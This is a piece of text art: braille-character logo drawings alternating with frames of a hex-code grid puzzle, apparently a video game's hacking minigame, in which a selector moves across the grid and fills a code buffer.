⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  00  00  00  00  00  00 ]
                                                                               
                                                        55   7F   5A   7F   55 
                                                                               
                                                 ┌───┐                         
                                                 ┤   ├──44───0B───5A───7E───0A─
                                                 └───┘                         
                                                                               
                                                   44   55   0B   10   13   55 


​                                                                               
                                                   13   10   7F   FE   FE   44 


​                                                                               
                                                   7F   0A   FE   F8   F8   5A 


​                                                                               
                                                   7E   10   13   0B   7E   0A 
                                                                               
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  00  00  00  00  00  00 ]
                                                                               
                                                        55   7F   5A   7F   55 
                                                                               
                                                      ┌───┐                    
                                                 ─────┤#44├──0B───5A───7E───0A─
                                                      └───┘                    
                                                                               
                                                   44   55   0B   10   13   55 


​                                                                               
                                                   13   10   7F   FE   FE   44 


​                                                                               
                                                   7F   0A   FE   F8   F8   5A 


​                                                                               
                                                   7E   10   13   0B   7E   0A 
                                                                               
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  00  00  00  00  00 ]
                                                        │                      
                                                        55   7F   5A   7F   55 
                                                        │                      
                                                      ┌─┴─┐                    
                                                      │   │  0B   5A   7E   0A 
                                                      └─┬─┘                    
                                                        │                      
                                                   44   55   0B   10   13   55 
                                                        │                      
                                                        │                      
                                                   13   10   7F   FE   FE   44 
                                                        │                      
                                                        │                      
                                                   7F   0A   FE   F8   F8   5A 
                                                        │                      
                                                        │                      
                                                   7E   10   13   0B   7E   0A 
                                                        │                      
                                                            $> 

...


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                               
                                                        55   7F   5A   7F   55 


​                                                                               
                                                             0B   5A   7E   0A 


​                                                                               
                                                   44             10   13   55 


​                                                                               
                                                   13   10        FE        44 
                                                                               
                                                                     ┌───┐     
                                                 ──7F───0A───FE───F8─┤   ├──5A─
                                                                     └───┘     
                                                                               
